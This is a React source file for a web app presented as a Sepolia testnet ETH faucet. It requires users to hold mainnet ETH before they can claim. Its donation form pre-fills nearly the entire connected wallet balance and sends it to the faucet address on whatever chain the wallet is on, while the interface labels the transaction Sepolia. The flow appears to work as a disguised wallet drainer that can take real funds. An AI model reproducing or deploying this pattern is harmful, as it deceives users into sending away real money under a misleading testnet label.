import React, { useState, useEffect } from "react";
import "./App.css";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useSendTransaction } from "wagmi";
import { ethers } from "ethers";

const FAUCET_ADDRESS = "0xe19c88086C8d551C81ff8a3e2c5DF87a88110a51";

const App = () => {
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const [address, setAddress] = useState("");
  const [txInfo, setTxInfo] = useState<{
    hash: string;
    to: string;
    network: string;
  } | null>(null);
  const [loading, setLoading] = useState(false);
  const [donateAmount, setDonateAmount] = useState("");
  const [donateTx, setDonateTx] = useState<{
    hash: string;
    network: string;
  } | null>(null);
  const [donateLoading, setDonateLoading] = useState(false);

  const { address: userAddress, isConnected } = useAccount();

  const mainnetProvider = new ethers.providers.JsonRpcProvider(
    "https://eth.llamarpc.com"
  );
  // 🔹 Handle Faucet (Receive) Submit
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setTxInfo(null);
    setErrorMessage(null);

    try {
      // ✅ Check mainnet balance first
      const mainnetBalance = await mainnetProvider.getBalance(address);
      if (mainnetBalance.isZero()) {
        setLoading(false);
        setErrorMessage(
          "You need to have some ETH on mainnet to claim testnet ETH so as to avoid spamming."
        );
        return;
      }

      // ✅ Check if user already claimed from faucet in the past 24h
      const etherscanApiKey = process.env.REACT_APP_ETHERSCAN_API_KEY; // add to your .env
      const txRes = await fetch(
        `https://api-sepolia.etherscan.io/api?module=account&action=txlist&address=${FAUCET_ADDRESS}&sort=desc&apikey=${etherscanApiKey}`
      );
      const txData = await txRes.json();

      if (txData.status === "1" && Array.isArray(txData.result)) {
        const now = Math.floor(Date.now() / 1000);
        const recentClaim = txData.result.find((tx: any) => {
          const isToUser = tx.to?.toLowerCase() === address.toLowerCase();
          const isRecent = now - Number(tx.timeStamp) < 86400; // 24h
          return isToUser && isRecent;
        });

        if (recentClaim) {
          setLoading(false);
          setErrorMessage(
            "You’ve already claimed from the faucet in the past 24 hours. Please try again later."
          );
          return;
        }
      }

      // ✅ Proceed with Sepolia faucet if not claimed recently
      const res = await fetch("/api/faucet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ to: address }),
      });
      const data = await res.json();
      setLoading(false);

      if (data.txHash) {
        setTxInfo({
          hash: data.txHash,
          to: address,
          network: "Ethereum Sepolia",
        });
      } else {
        alert(data.message || "Transaction failed");
      }
    } catch (err) {
      setLoading(false);
      console.error(err);
      setErrorMessage("Something went wrong checking your balance or history.");
    }
  };

  // 🔹 Donate Section Logic
  useEffect(() => {
    const fetchBalance = async () => {
      if (!isConnected || !userAddress || !window.ethereum) return;

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const balance = await provider.getBalance(userAddress);
        const balanceEth = parseFloat(ethers.utils.formatEther(balance));
        const defaultAmount = Math.max(balanceEth - 0.05, 0).toFixed(4);
        setDonateAmount(defaultAmount);
      } catch (err) {
        console.error("Failed to fetch balance:", err);
      }
    };

    fetchBalance();
  }, [isConnected, userAddress]);

  const normalizedDonateAmount = donateAmount.replace(",", ".").trim();

  let donateAmountWei: bigint | undefined;
  try {
    const amt = ethers.utils.parseEther(normalizedDonateAmount || "0");
    donateAmountWei = BigInt(amt.toString());
  } catch {
    donateAmountWei = undefined;
  }

  const { sendTransaction: sendDonateTx } = useSendTransaction({
    to: FAUCET_ADDRESS,
    value: donateAmountWei,
    onSettled(data, error) {
      setDonateLoading(false);
      if (error) {
        console.error("Donate Error:", error);
        alert("Transaction failed.");
      } else if (data?.hash) {
        setDonateTx({ hash: data.hash, network: "Ethereum Sepolia" });
      }
    },
  });

  const handleDonate = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isConnected) {
      alert("Connect your wallet first!");
      return;
    }

    if (!normalizedDonateAmount || isNaN(Number(normalizedDonateAmount))) {
      alert("Enter a valid amount.");
      return;
    }

    setDonateLoading(true);

    try {
      await sendDonateTx?.();
    } catch (err) {
      setDonateLoading(false);
      console.error(err);
      alert("Transaction failed.");
    }
  };

  return (
    <div className="container">
      <div className="login">
        <ConnectButton />
      </div>

      <h1>Sepolia ETH Faucet</h1>
      <p>Claim some testnet ETH instantly</p>

      {/* 🔹 Receive Section */}
      <form onSubmit={handleSubmit} className="faucet-form">
        <div className="form-group">
          <label htmlFor="ethAddress">Ethereum Address</label>
          <input
            type="text"
            id="ethAddress"
            className="form-control"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            placeholder="0x..."
            disabled={loading}
          />
        </div>
        <button
          type="submit"
          className="submit-btn"
          disabled={
            loading || !(address.startsWith("0x") && address.length === 42)
          }
        >
          {loading ? "Sending..." : "Get Sepolia ETH"}
        </button>
      </form>

      {errorMessage && <div className="error-message">{errorMessage}</div>}

      {loading && (
        <div className="loader-container">
          <div className="loader"></div>
          <p>Sending transaction...</p>
        </div>
      )}

      {txInfo && (
        <div className="confirmation-card">
          {/* Close button */}
          <button
            className="close-btn"
            onClick={() => setTxInfo(null)}
            aria-label="Close"
          >
            ×
          </button>

          <h2>💧 Drip complete</h2>
          <p>Testnet tokens sent! Check your wallet address.</p>
          <div className="confirmation-row">
            <strong>Network:</strong> {txInfo.network}
          </div>
          <div className="confirmation-row">
            <strong>Recipient:</strong> {txInfo.to}
          </div>
          <div className="confirmation-row">
            <strong>Transaction hash:</strong>{" "}
            <a
              href={`https://sepolia.etherscan.io/tx/${txInfo.hash}`}
              target="_blank"
              rel="noopener noreferrer"
            >
              {txInfo.hash}
            </a>
          </div>
        </div>
      )}

      {/* 🔹 Donate Section */}
      {isConnected ? (
        <>
          <hr
            style={{
              border: "none",
              height: "2px",
              backgroundColor: "#4ade80", // a nice green, Vercel-ish vibe
              margin: "2rem 0",
              borderRadius: "1px",
            }}
          />
          {!donateTx && !donateLoading && (
            <form onSubmit={handleDonate} className="faucet-form">
              <div className="form-group">
                <label htmlFor="donateForm">Amount in ETH</label>
                <input
                  type="number"
                  id="donateForm"
                  value={donateAmount}
                  className="form-control"
                  onChange={(e) => setDonateAmount(e.target.value)}
                  placeholder="0.1"
                  disabled={donateLoading}
                />
              </div>
              <button
                className="submit-btn"
                type="submit"
                disabled={donateLoading}
              >
                Give back to the faucet
              </button>
            </form>
          )}

          {donateLoading && (
            <div className="loader-container">
              <div className="loader"></div>
              <p>Sending donation...</p>
            </div>
          )}

          {donateTx && (
            <div className="confirmation-card">
              {/* Close button */}
              <button
                className="close-btn"
                onClick={() => setDonateTx(null)}
                aria-label="Close"
              >
                &times;
              </button>

              <h2>💚 Donation sent</h2>
              <p>Thanks for supporting the faucet!</p>
              <div className="confirmation-row">
                <strong>Network:</strong> {donateTx.network}
              </div>
              <div className="confirmation-row">
                <strong>Transaction hash:</strong>{" "}
                <a
                  href={`https://sepolia.etherscan.io/tx/${donateTx.hash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {donateTx.hash}
                </a>
              </div>
            </div>
          )}
        </>
      ) : (
        <div className="section-divider">
          ... Or connect your wallet to donate back to the faucet 💚
        </div>
      )}
    </div>
  );
};

export default App;
